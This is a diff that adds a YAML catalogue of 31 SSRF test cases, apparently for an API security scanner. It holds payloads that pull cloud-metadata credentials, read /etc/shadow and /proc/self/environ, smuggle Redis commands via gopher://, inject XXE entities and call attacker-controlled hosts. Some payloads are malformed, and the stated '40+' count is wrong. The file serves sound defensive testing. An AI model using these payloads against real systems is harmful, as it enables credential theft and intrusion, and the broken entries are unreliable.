@@ -1,0 +1,841 @@
+# SSRF - Server-Side Request Forgery Test Cases
+# Reference: CWE-918, OWASP API7-2023
+# Total: 40+ test cases covering AWS, GCP, Aliyun, Internal, etc.
+
+api_version: "1.0"
+category: SSRF
+
+test_cases:
+
+  # === AWS Metadata ===
+  - id: SSRF-001
+    name: SSRF - AWS EC2 Metadata Service
+    severity: CRITICAL
+    cwe_id: CWE-918
+    owasp_ref: API7-2023
+    description: Test SSRF targeting AWS EC2 metadata endpoint
+    vuln_type: SSRF
+    method: GET
+    path: /api/fetch
+    parameters:
+      - name: url
+        type: string
+        location: query
+    payloads:
+      - "http://169.254.169.254/latest/meta-data/"
+      - "http://169.254.169.254/latest/user-data/"
+      - "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+      - "http://169.254.169.254/latest/api/token"
+      - "http://metadata.ec2.internal/latest/meta-data/"
+      - "http://[::1]/latest/meta-data/"
+    expected_response:
+      check_pattern: "ami-id|instance-id|security-credentials"
+    validation:
+      type: ssrf
+      indicators:
+        - "ami-id"
+        - "instance-id"
+        - "aws-access-key"
+    remediation: |
+      Validate and sanitize all user-supplied URLs.
+      Use allowlist for permitted domains.
+      Disable EC2 metadata service on production.
+
+  - id: SSRF-002
+    name: SSRF - AWS EC2 User Data
+    severity: CRITICAL
+    cwe_id: CWE-918
+    description: Test SSRF to extract AWS EC2 user data
+    vuln_type: SSRF
+    method: GET
+    path: /api/download
+    parameters:
+      - name: file
+        type: string
+        location: query
+    payloads:
+      - "http://169.254.169.254/latest/user-data/"
+      - "http://169.254.169.254/latest/user-data/?full=true"
+      - "http://metadata.google.internal/computeMetadata/v1/instance/attributes/"
+    expected_response:
+      check_pattern: "password|secret|key|token"
+    validation:
+      type: ssrf_aws
+      indicators:
+        - "password"
+        - "api_key"
+        - "secret"
+    remediation: Encrypt user data. Use AWS Secrets Manager.
+
+  - id: SSRF-003
+    name: SSRF - AWS IAM Credentials
+    severity: CRITICAL
+    cwe_id: CWE-918
+    description: Test SSRF to extract IAM role credentials
+    vuln_type: SSRF
+    method: GET
+    path: /api/proxy
+    parameters:
+      - name: target
+        type: string
+        location: query
+    payloads:
+      - "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+      - "http://169.254.169.254/latest/meta-data/iam/security-credentials/RoleName"
+      - "http://169.254.169.254/latest/api/token"
+    expected_response:
+      check_pattern: "AccessKeyId|SecretAccessKey|Token"
+    validation:
+      type: ssrf_aws_iam
+      indicators:
+        - "AccessKeyId"
+        - "SecretAccessKey"
+        - "Token"
+    remediation: Use IAM roles instead of static credentials.
+
+  # === GCP Metadata ===
+  - id: SSRF-004
+    name: SSRF - GCP Cloud Metadata API
+    severity: CRITICAL
+    cwe_id: CWE-918
+    description: Test SSRF targeting GCP metadata service
+    vuln_type: SSRF
+    method: GET
+    path: /api/fetch
+    parameters:
+      - name: url
+        type: string
+        location: query
+    payloads:
+      - "http://metadata.google.internal/computeMetadata/v1/"
+      - "http://metadata.google.internal/computeMetadata/v1/instance/"
+      - "http://metadata.google.internal/computeMetadata/v1/project/project-id"
+      - "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/"
+      - "http://metadata.google.internal/computeMetadata/v1/instance/attributes/"
+      - "http://[::1]/computeMetadata/v1/"
+    expected_response:
+      check_pattern: "project-id|instance-name|service-accounts"
+    validation:
+      type: ssrf_gcp
+      indicators:
+        - "project-id"
+        - "instance-name"
+    remediation: Restrict metadata access. Use VPC Service Controls.
+
+  - id: SSRF-005
+    name: SSRF - GCP Service Account Tokens
+    severity: CRITICAL
+    cwe_id: CWE-918
+    description: Test SSRF to extract GCP service account tokens
+    vuln_type: SSRF
+    method: GET
+    path: /api/load
+    parameters:
+      - name: src
+        type: string
+        location: query
+    payloads:
+      - "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity"
+      - "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
+      - "http://metadata.google.internal/computeMetadata/v1/project/project-id/service-accounts/"
+    expected_response:
+      check_pattern: "access_token|expires_in|scopes"
+    validation:
+      type: ssrf_gcp_token
+      indicators:
+        - "access_token"
+        - "expires_in"
+        - "audience"
+    remediation: Disable metadata service. Use Workload Identity.
+
+  # === Aliyun Metadata ===
+  - id: SSRF-006
+    name: SSRF - Aliyun ECS Metadata
+    severity: CRITICAL
+    cwe_id: CWE-918
+    description: Test SSRF targeting Aliyun ECS metadata service
+    vuln_type: SSRF
+    method: GET
+    path: /api/resource
+    parameters:
+      - name: endpoint
+        type: string
+        location: query
+    payloads:
+      - "http://100.100.100.200/latest/meta-data/"
+      - "http://100.100.100.200/latest/user-data/"
+      - "http://100.100.100.200/latest/meta-data/instance-id"
+      - "http://100.100.100.200/latest/meta-data/owner-account-id"
+      - "http://100.100.100.200/latest/meta-data/ram/security-credentials/"
+    expected_response:
+      check_pattern: "instance-id|owner-account|ram"
+    validation:
+      type: ssrf_aliyun
+      indicators:
+        - "instance-id"
+        - "owner-account"
+    remediation: Enable Aliyun RAM protection. Use STS tokens.
+
+  - id: SSRF-007
+    name: SSRF - Aliyun STS Token
+    severity: CRITICAL
+    cwe_id: CWE-918
+    description: Test SSRF to extract Aliyun STS tokens
+    vuln_type: SSRF
+    method: GET
+    path: /api/token
+    parameters:
+      - name: path
+        type: string
+        location: query
+    payloads:
+      - "http://100.100.100.200/latest/meta-data/ram/security-credentials/"
+      - "http://100.100.100.200/latest/api/token"
+    expected_response:
+      check_pattern: "AccessKeyId|SecretAccessKey|SecurityToken"
+    validation:
+      type: ssrf_aliyun_sts
+      indicators:
+        - "AccessKeyId"
+        - "SecurityToken"
+    remediation: Use RAM roles. Enable instance RAM roles.
+
+  # === Azure Metadata ===
+  - id: SSRF-008
+    name: SSRF - Azure Instance Metadata Service
+    severity: CRITICAL
+    cwe_id: CWE-918
+    description: Test SSRF targeting Azure IMDS
+    vuln_type: SSRF
+    method: GET
+    path: /api/fetch
+    parameters:
+      - name: resource
+        type: string
+        location: query
+    payloads:
+      - "http://169.254.169.254/metadata/instance"
+      - "http://169.254.169.254/metadata/instance/compute"
+      - "http://169.254.169.254/metadata/instance/network/interface"
+      - "http://169.254.169.254/metadata/identity/info"
+      - "http://169.254.169.254/metadata/admin/ssh/public-key"
+    expected_response:
+      check_pattern: "subscriptionId|resourceGroupName|vmId"
+    validation:
+      type: ssrf_azure
+      indicators:
+        - "subscriptionId"
+        - "resourceGroupName"
+    remediation: Disable IMDS. Use Azure Managed Identities.
+
+  - id: SSRF-009
+    name: SSRF - Azure Key Vault
+    severity: CRITICAL
+    cwe_id: CWE-918
+    description: Test SSRF to access Azure Key Vault via IMDS
+    vuln_type: SSRF
+    method: GET
+    path: /api/secrets
+    parameters:
+      - name: vault
+        type: string
+        location: query
+    payloads:
+      - "http://169.254.169.254/metadata/identity/info"
+      - "http://127.0.0.1:5034/msi/token"
+      - "http://localhost:5034/metadata/identity/oauth2/token"
+    expected_response:
+      check_pattern: "access_token|keyvault|secret"
+    validation:
+      type: ssrf_azure_keyvault
+      indicators:
+        - "access_token"
+        - "vault"
+    remediation: Use Azure AD authentication. Restrict Key Vault access.
+
+  # === Internal Network Scanning ===
+  - id: SSRF-010
+    name: SSRF - Internal Port Scanning
+    severity: HIGH
+    cwe_id: CWE-918
+    description: Test SSRF for internal network port scanning
+    vuln_type: SSRF
+    method: GET
+    path: /api/check
+    parameters:
+      - name: host
+        type: string
+        location: query
+    payloads:
+      - "http://127.0.0.1:22"
+      - "http://127.0.0.1:80"
+      - "http://127.0.0.1:443"
+      - "http://127.0.0.1:3306"
+      - "http://127.0.0.1:5432"
+      - "http://127.0.0.1:6379"
+      - "http://192.168.1.1:80"
+      - "http://10.0.0.1:8080"
+    expected_response:
+      status_code: 200
+    validation:
+      type: ssrf_scan
+      indicators:
+        - open_port: true
+        - response_time: < 5
+    remediation: Block internal IP ranges. Use URL validation.
+
+  - id: SSRF-011
+    name: SSRF - Internal Service Detection
+    severity: HIGH
+    cwe_id: CWE-918
+    description: Test SSRF to detect internal services
+    vuln_type: SSRF
+    method: GET
+    path: /api/proxy
+    parameters:
+      - name: dest
+        type: string
+        location: query
+    payloads:
+      - "http://internal-db.local:3306"
+      - "http://redis.internal:6379"
+      - "http://memcached.internal:11211"
+      - "http://elasticsearch.local:9200"
+      - "http://zookeeper.internal:2181"
+      - "http://kafka.internal:9092"
+    expected_response:
+      status_code: 200
+    validation:
+      type: ssrf_internal
+      indicators:
+        - service_detected: true
+    remediation: Network segmentation. Block internal DNS names.
+
+  # === File System Access ===
+  - id: SSRF-012
+    name: SSRF - Local File Inclusion
+    severity: HIGH
+    cwe_id: CWE-918
+    description: Test SSRF to read local files
+    vuln_type: SSRF
+    method: GET
+    path: /api/view
+    parameters:
+      - name: file
+        type: string
+        location: query
+    payloads:
+      - "file:///etc/passwd"
+      - "file:///etc/hosts"
+      - "file:///proc/self/environ"
+      - "file:///proc/self/cmdline"
+      - "file:///etc/shadow"
+      - "file:///var/log/access.log"
+    expected_response:
+      check_pattern: "root:|daemon:|nobody:"
+    validation:
+      type: ssrf_lfi
+      indicators:
+        - "root:"
+        - "daemon:"
+    remediation: Disable file:// scheme. Validate file paths.
+
+  # === Protocol Attacks ===
+  - id: SSRF-013
+    name: SSRF - Protocol Smuggling (gopher://)
+    severity: CRITICAL
+    cwe_id: CWE-918
+    description: Test SSRF using gopher protocol for internal attacks
+    vuln_type: SSRF
+    method: GET
+    path: /api/send
+    parameters:
+      - name: data
+        type: string
+        location: query
+    payloads:
+      - "gopher://127.0.0.1:6379/_*1\r\n$7\r\nSLAVEOF\r\n$13\r\n127.0.0.1\r\n$5\r\n26379\r\n"
+      - "gopher://127.0.0.1:6379/_*3\r\n$3\r\nSET\r\n$4\r\ntest\r\n$5\r\nvalue\r\n"
+      - "gopher://127.0.0.1:25MAIL FROM:<attacker@example.com>"
+      - "gopher://127.0.0.1:3306/_4\r\nSETMASSWORD\r\n"
+    expected_response:
+      status_code: 200
+    validation:
+      type: ssrf_gopher
+      indicators:
+        - "OK"
+        - "+PONG"
+    remediation: Block gopher:// and other dangerous protocols.
+
+  - id: SSRF-014
+    name: SSRF - FTP Protocol Brute Force
+    severity: MEDIUM
+    cwe_id: CWE-918
+    description: Test SSRF using FTP protocol
+    vuln_type: SSRF
+    method: GET
+    path: /api/connect
+    parameters:
+      - name: target
+        type: string
+        location: query
+    payloads:
+      - "ftp://anonymous:password@internal-ftp.local"
+      - "ftp://internal-ftp.local/pub/"
+      - "http://internal-ftp.local"
+    expected_response:
+      status_code: 200
+    validation:
+      type: ssrf_ftp
+      indicators:
+        - "anonymous"
+        - "login successful"
+    remediation: Block FTP protocol. Use SFTP instead.
+
+  # === Cloud Meta Services ===
+  - id: SSRF-015
+    name: SSRF - DigitalOcean Metadata
+    severity: CRITICAL
+    cwe_id: CWE-918
+    description: Test SSRF targeting DigitalOcean metadata service
+    vuln_type: SSRF
+    method: GET
+    path: /api/droplet
+    parameters:
+      - name: info
+        type: string
+        location: query
+    payloads:
+      - "http://169.254.169.254/metadata/v1/"
+      - "http://169.254.169.254/metadata/v1/id"
+      - "http://169.254.169.254/metadata/v1/user-data"
+      - "http://169.254.169.254/metadata/v1/interfaces/public/0/ipv4/address"
+      - "http://169.254.169.254/metadata/v1.json"
+    expected_response:
+      check_pattern: "id|droplet|ipv4"
+    validation:
+      type: ssrf_digitalocean
+      indicators:
+        - "droplet"
+        - "id"
+    remediation: Disable metadata service. Use cloud firewalls.
+
+  - id: SSRF-016
+    name: SSRF - Kubernetes ETCD
+    severity: CRITICAL
+    cwe_id: CWE-918
+    description: Test SSRF targeting Kubernetes ETCD
+    vuln_type: SSRF
+    method: GET
+    path: /api/secrets
+    parameters:
+      - name: path
+        type: string
+        location: query
+    payloads:
+      - "http://127.0.0.1:2379/v2/keys/"
+      - "http://127.0.0.1:2379/v2/keys/secrets"
+      - "http://localhost:2379/v2/keys/kubescape/"
+      - "https://kubernetes.default.svc/api/v1/namespaces/default/secrets"
+    expected_response:
+      check_pattern: "key|value|secret"
+    validation:
+      type: ssrf_k8s
+      indicators:
+        - "key"
+        - "secret"
+    remediation: Secure ETCD. Use RBAC. Enable TLS.
+
+  # === Response-Based Attacks ===
+  - id: SSRF-017
+    name: SSRF - Response-Based Data Extraction
+    severity: HIGH
+    cwe_id: CWE-918
+    description: Test SSRF where data is reflected in response
+    vuln_type: SSRF
+    method: GET
+    path: /api/load
+    parameters:
+      - name: url
+        type: string
+        location: query
+    payloads:
+      - "http://169.254.169.254/latest/user-data/"
+      - "file:///etc/passwd"
+      - "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+    expected_response:
+      status_code: 200
+    validation:
+      type: ssrf_response
+      indicators:
+        - data_extracted: true
+    remediation: Don't reflect external content. Sanitize responses.
+
+  # === DNS Rebinding ===
+  - id: SSRF-018
+    name: SSRF - DNS Rebinding Attack
+    severity: HIGH
+    cwe_id: CWE-918
+    description: Test SSRF using DNS rebinding technique
+    vuln_type: SSRF
+    method: GET
+    path: /api/fetch
+    parameters:
+      - name: url
+        type: string
+        location: query
+    payloads:
+      - "http://attacker.domain.com"
+      - "http://internal.attacker.com"
+      - "http://127.0.0.1.attacker.com"
+      - "http://169.254.169.254.attacker.com"
+    expected_response:
+      status_code: 200
+    validation:
+      type: ssrf_dns_rebinding
+      indicators:
+        - dns_rebinding: true
+    remediation: Validate Host header. Use DNS pinning.
+
+  # === Blind SSRF ===
+  - id: SSRF-019
+    name: SSRF - Blind SSRF via DNS Lookup
+    severity: MEDIUM
+    cwe_id: CWE-918
+    description: Test blind SSRF where only DNS resolution is observable
+    vuln_type: SSRF_BLIND
+    method: GET
+    path: /api/resolve
+    parameters:
+      - name: domain
+        type: string
+        location: query
+    payloads:
+      - "internal-db.local.burpcollaborator.net"
+      - "169.254.169.254.burpcollaborator.net"
+      - "attacker-controlled.dnslog.com"
+      - "internal-api.local.dnslog.cn"
+    expected_response:
+      status_code: 200
+    validation:
+      type: blind_ssrf
+      indicators:
+        - dns_lookup: true
+    remediation: Block external domains. Use DNS filtering.
+
+  - id: SSRF-020
+    name: SSRF - Time-Based Blind Detection
+    severity: MEDIUM
+    cwe_id: CWE-918
+    description: Test blind SSRF using response time differences
+    vuln_type: SSRF_BLIND
+    method: GET
+    path: /api/check
+    parameters:
+      - name: url
+        type: string
+        location: query
+    payloads:
+      - "http://169.254.169.254/latest/meta-data/"
+      - "http://internal-server.local/slow-endpoint"
+      - "http://metadata.google.internal/computeMetadata/v1/"
+    expected_response:
+      status_code: 200
+    validation:
+      type: time_based_ssrf
+      indicators:
+        - response_time_delay: 3
+    remediation: Timeout external requests. Block metadata IPs.
+
+  # === Filter Bypass ===
+  - id: SSRF-021
+    name: SSRF - URL Validation Bypass (localhost)
+    severity: HIGH
+    cwe_id: CWE-918
+    description: Test SSRF bypass using localhost variants
+    vuln_type: SSRF
+    method: GET
+    path: /api/proxy
+    parameters:
+      - name: url
+        type: string
+        location: query
+    payloads:
+      - "http://localhost/admin"
+      - "http://0.0.0.0/admin"
+      - "http://[::1]/admin"
+      - "http://127.001.001.001/"
+      - "http://127.1/"
+      - "http://127.000.000.001/"
+    expected_response:
+      status_code: 200
+    validation:
+      type: ssrf_bypass
+      indicators:
+        - bypass_successful: true
+    remediation: Block all localhost variants. Use CIDR notation.
+
+  - id: SSRF-022
+    name: SSRF - IP Encoding Bypass
+    severity: HIGH
+    cwe_id: CWE-918
+    description: Test SSRF bypass using IP encoding
+    vuln_type: SSRF
+    method: GET
+    path: /api/fetch
+    parameters:
+      - name: url
+        type: string
+        location: query
+    payloads:
+      - "http://2130706433/"  # 127.0.0.1 in decimal
+      - "http://0x7f000001/"  # 127.0.0.1 in hex
+      - "http://3232235777/"  # 192.168.1.1 in decimal
+      - "http://3232235777:80/"
+      - "http://0xC0A80101/"   # 192.168.1.1 in hex
+    expected_response:
+      status_code: 200
+    validation:
+      type: ssrf_ip_encoding
+      indicators:
+        - "localhost"
+        - "internal"
+    remediation: Validate and normalize all URLs before use.
+
+  - id: SSRF-023
+    name: SSRF - Domain Name Variation
+    severity: HIGH
+    cwe_id: CWE-918
+    description: Test SSRF bypass using domain name variations
+    vuln_type: SSRF
+    method: GET
+    path: /api/load
+    parameters:
+      - name: domain
+        type: string
+        location: query
+    payloads:
+      - "localhost@example.com"
+      - "internal-site.com.evil.com"
+      - "internal-website.local.evil.com"
+      - "169.254.169.254.aliyundns.com"
+    expected_response:
+      status_code: 200
+    validation:
+      type: ssrf_domain_variation
+      indicators:
+        - bypass_successful: true
+    remediation: Use allowlist. Validate domain ownership.
+
+  - id: SSRF-024
+    name: SSRF - Redirect Following
+    severity: HIGH
+    cwe_id: CWE-918
+    description: Test SSRF by following server redirects
+    vuln_type: SSRF
+    method: GET
+    path: /api/fetch
+    parameters:
+      - name: url
+        type: string
+        location: query
+    payloads:
+      - "http://trusted-site.com/redirect?url=http://169.254.169.254/"
+      - "http://trusted-site.com/302?url=http://127.0.0.1/"
+      - "http://trusted-site.com/proxy?url=http://internal.local/"
+    expected_response:
+      status_code: 200
+    validation:
+      type: ssrf_redirect
+      indicators:
+        - redirected_to_internal: true
+    remediation: Don't follow redirects. Validate redirect targets.
+
+  # === Special Cases ===
+  - id: SSRF-025
+    name: SSRF - XXE to SSRF
+    severity: CRITICAL
+    cwe_id: CWE-918
+    description: Test XXE vulnerability leading to SSRF
+    vuln_type: SSRF
+    method: POST
+    path: /api/xml/upload
+    parameters:
+      - name: xml
+        type: xml
+        location: body
+    payloads:
+      - '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>'
+      - '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
+    expected_response:
+      check_pattern: "ami-id|instance-id"
+    validation:
+      type: ssrf_xxe
+      indicators:
+        - "instance-id"
+        - "ami-id"
+    remediation: Disable XXE processing. Use safe XML parsers.
+
+  - id: SSRF-026
+    name: SSRF - PDF Generation
+    severity: HIGH
+    cwe_id: CWE-918
+    description: Test SSRF via PDF generation feature
+    vuln_type: SSRF
+    method: POST
+    path: /api/export/pdf
+    parameters:
+      - name: url
+        type: string
+        location: body
+    payloads:
+      - "http://169.254.169.254/latest/user-data/"
+      - "http://internal.local/secrets.txt"
+      - "file:///etc/passwd"
+    expected_response:
+      check_pattern: "password|secret|key"
+    validation:
+      type: ssrf_pdf
+      indicators:
+        - internal_content: true
+    remediation: Don't fetch external content in PDF generation.
+
+  - id: SSRF-027
+    name: SSRF - Image Processing (QR Code)
+    severity: MEDIUM
+    cwe_id: CWE-918
+    description: Test SSRF via image QR code generation
+    vuln_type: SSRF
+    method: POST
+    path: /api/qrcode
+    parameters:
+      - name: content
+        type: string
+        location: body
+    payloads:
+      - "http://169.254.169.254/latest/meta-data/"
+      - "http://internal.local/admin"
+      - "file:///etc/hosts"
+    expected_response:
+      status_code: 200
+    validation:
+      type: ssrf_qrcode
+      indicators:
+        - qr_generated: true
+    remediation: Sanitize QR code content. Block internal URLs.
+
+  - id: SSRF-028
+    name: SSRF - Webhook/Callback
+    severity: MEDIUM
+    cwe_id: CWE-918
+    description: Test SSRF via webhook callback feature
+    vuln_type: SSRF
+    method: POST
+    path: /api/webhook
+    parameters:
+      - name: callback_url
+        type: string
+        location: body
+    payloads:
+      - "http://169.254.169.254/latest/user-data/"
+      - "http://internal.local:8080/admin"
+      - "http://attacker.com/callback"
+    expected_response:
+      status_code: 200
+    validation:
+      type: ssrf_webhook
+      indicators:
+        - callback_received: true
+    remediation: Use allowlist for callback URLs. Verify ownership.
+
+  - id: SSRF-029
+    name: SSRF - OAuth Token Fetch
+    severity: HIGH
+    cwe_id: CWE-918
+    description: Test SSRF via OAuth redirect_uri parameter
+    vuln_type: SSRF
+    method: GET
+    path: /oauth/authorize
+    parameters:
+      - name: redirect_uri
+        type: string
+        location: query
+    payloads:
+      - "http://169.254.169.254/latest/user-data/"
+      - "http://localhost:8080/callback"
+      - "file:///etc/passwd"
+    expected_response:
+      status_code: 200
+    validation:
+      type: ssrf_oauth
+      indicators:
+        - redirect_to_internal: true
+    remediation: Validate redirect_uri against allowlist.
+
+  - id: SSRF-030
+    name: SSRF - OpenID Dynamic Client Registration
+    severity: HIGH
+    cwe_id: CWE-918
+    description: Test SSRF via OpenID client registration
+    vuln_type: SSRF
+    method: POST
+    path: /api/openid/register
+    parameters:
+      - name: logo_uri
+        type: string
+        location: body
+    payloads:
+      - "http://169.254.169.254/latest/meta-data/"
+      - "http://internal.local/logo.png"
+      - "file:///etc/passwd"
+    expected_response:
+      status_code: 200
+    validation:
+      type: ssrf_openid
+      indicators:
+        - logo_fetched: true
+    remediation: Don't fetch external resources during registration.
+
+  # === Comprehensive ===
+  - id: SSRF-031
+    name: SSRF - Full Coverage Test
+    severity: CRITICAL
+    cwe_id: CWE-918
+    description: Comprehensive SSRF test covering all attack vectors
+    vuln_type: SSRF
+    method: POST
+    path: /api/submit
+    parameters:
+      - name: url
+        type: string
+        location: body
+    attack_vectors:
+      - name: aws_metadata
+        payloads:
+          - "http://169.254.169.254/latest/meta-data/"
+          - "http://169.254.169.254/latest/user-data/"
+      - name: gcp_metadata
+        payloads:
+          - "http://metadata.google.internal/computeMetadata/v1/"
+      - name: aliyun_metadata
+        payloads:
+          - "http://100.100.100.200/latest/meta-data/"
+      - name: azure_metadata
+        payloads:
+          - "http://169.254.169.254/metadata/instance"
+      - name: internal_access
+        payloads:
+          - "http://127.0.0.1:80/"
+          - "http://192.168.1.1:8080/"
+      - name: file_access
+        payloads:
+          - "file:///etc/passwd"
+    expected_response:
+      status_code: 200
+    validation:
+      type: comprehensive_ssrf
+      indicators:
+        - aws_leak: true
+        - internal_access: true
+        - file_read: true
+    remediation: Use defense in depth. Multiple validation layers.
